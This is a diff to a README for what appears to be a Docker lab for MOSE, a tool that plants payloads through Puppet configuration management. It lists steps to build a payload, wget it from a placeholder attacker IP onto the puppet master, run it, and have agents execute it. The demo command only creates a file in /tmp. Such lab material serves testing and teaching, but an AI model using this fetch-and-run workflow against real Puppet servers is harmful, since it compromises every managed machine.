@@ -69,7 +69,7 @@ To run MOSE against it:
 1. Build MOSE using `make build` in the MOSE repo
 2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t puppet`
 3. Get it to the puppet master: `docker exec -it extended-puppetmaster wget http://YOURIPADDRESSGOESHERE:8090/puppet-linux`
-4. Exec into the puppet master: `docker exec -it basic-puppetmaster bash`
+4. Exec into the puppet master: `docker exec -it extended-puppetmaster bash`
 5. Run the payload: `chmod +x puppet-linux; ./puppet-linux`
 6. Wait for 30 minutes or exec into one of the agents and kick off the payload manually: `docker exec -it prodlaptop bash` and then run `puppet agent -t`
 7. For this example, you should note that a file has been created in `/tmp` in the prodlaptop container, as we specified in step 2.
